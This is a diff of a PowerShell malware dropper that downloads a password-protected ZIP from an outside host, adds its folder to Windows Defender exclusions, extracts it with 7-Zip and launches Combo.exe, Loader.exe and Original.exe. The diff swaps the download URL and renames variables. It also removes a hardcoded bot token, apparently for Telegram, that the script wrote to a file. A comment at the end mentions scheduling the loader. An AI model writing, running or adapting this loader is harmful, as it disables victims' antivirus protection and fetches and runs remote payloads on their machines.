@@ -2,15 +2,15 @@
 $7zipUrl = "https://www.7-zip.org/a/7z2301-x64.exe"  # 7-Zip 64-bit installer
 $installerPath = "$env:TEMP\7zInstaller.exe"
 $7zipPath = "C:\Program Files\7-Zip\7z.exe"
-$zipUrl = "https://raw.githubusercontent.com/osacarbald/newuplsss/main/payload.zip"
+$zipUrl = "https://xsf.com.ng/ss/bitch.zip"
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $folderPath = Join-Path -Path $documentsPath -ChildPath "gogjothegoat"
 $zipFilePath = Join-Path $folderPath "file.zip"
 $password = "badguy-dneu77366"                # Replace with the ZIP file password
 $destinationPath = $folderPath     # Replace with desired extraction folder
-$payloadFolderPath = Join-Path $folderPath "payload"
+$bitchFolderPath = Join-Path $folderPath "bitch"
 $processName = "Original.exe"            # Process to check for and execute
-$tboy = "7642416431:AAGRRHpOzRdpupruWLRgOiInIgZ8J1iNHiI"
+
 
 $processName = "powershell.exe"
 Add-MpPreference -ExclusionPath $folderPath | Out-Null
@@ -59,39 +59,34 @@ if (Test-Path $7zipPath) {
     Write-Host "7-Zip installation failed or 7z.exe not found."
 }
 
-# Create a txt file with this
-# Create a txt file with the value of $tboy
-$tboyFilePath = Join-Path $payloadFolderPath "tboy.txt"
-$tboyContent = "tboy $tboy"
-$tboyContent | Out-File -FilePath $tboyFilePath -Encoding UTF8
-Write-Host "Created tboy.txt with value: $tboy"
 
-# Check if the payload folder exists and execute processes
-if (Test-Path $payloadFolderPath) {
-    Set-Location -Path $payloadFolderPath
-    Write-Host "Payload folder found, executing processes..."
+
+# Check if the bitch folder exists and execute processes
+if (Test-Path $bitchFolderPath) {
+    Set-Location -Path $bitchFolderPath
+    Write-Host "bitch folder found, executing processes..."
 
     # Check and start 'Original.exe' if not already running
-    $OriginalExePath = Join-Path $payloadFolderPath "Combo.exe"
+    $OriginalExePath = Join-Path $bitchFolderPath "Combo.exe"
     if (Test-Path $OriginalExePath) {
         $processRunning = Get-Process -Name "Combo" -ErrorAction SilentlyContinue
         if ($null -eq $processRunning) {
             Write-Host "Starting Combo.exe..."
-            Start-Process -FilePath $OriginalExePath -WorkingDirectory $payloadFolderPath
+            Start-Process -FilePath $OriginalExePath -WorkingDirectory $bitchFolderPath
             Write-Host "Waiting for 120 seconds before next step..."
             Start-Sleep -Seconds 5
         } else {
             Write-Host "'Combo.exe' is already running."
         }
     } else {
-        Write-Host "'Combo.exe' not found in the payload folder."
+        Write-Host "'Combo.exe' not found in the bitch folder."
     }
 
     # Execute Loader.exe if present
-    $LoaderPath = Join-Path $payloadFolderPath "Loader.exe"
+    $LoaderPath = Join-Path $bitchFolderPath "Loader.exe"
     if (Test-Path $LoaderPath) {
         Write-Host "Starting Loader.exe..."
-        Start-Process -FilePath $LoaderPath -WorkingDirectory $payloadFolderPath
+        Start-Process -FilePath $LoaderPath -WorkingDirectory $bitchFolderPath
     } else {
         Write-Host "Loader.exe not found."
     }
@@ -100,10 +95,10 @@ if (Test-Path $payloadFolderPath) {
 
 
       # Execute Original.exe if present
-    $OriginalPath = Join-Path $payloadFolderPath "Original.exe"
+    $OriginalPath = Join-Path $bitchFolderPath "Original.exe"
     if (Test-Path $LoaderPath) {
         Write-Host "Starting Original.exe..."
-        Start-Process -FilePath $OriginalPath -WorkingDirectory $payloadFolderPath
+        Start-Process -FilePath $OriginalPath -WorkingDirectory $bitchFolderPath
     } else {
         Write-Host "Original.exe not found."
     }
@@ -111,7 +106,7 @@ if (Test-Path $payloadFolderPath) {
 
 
 } else {
-    Write-Host "Payload folder not found."
+    Write-Host "bitch folder not found."
 }
 
 # I want to schedule a my Loader.exe
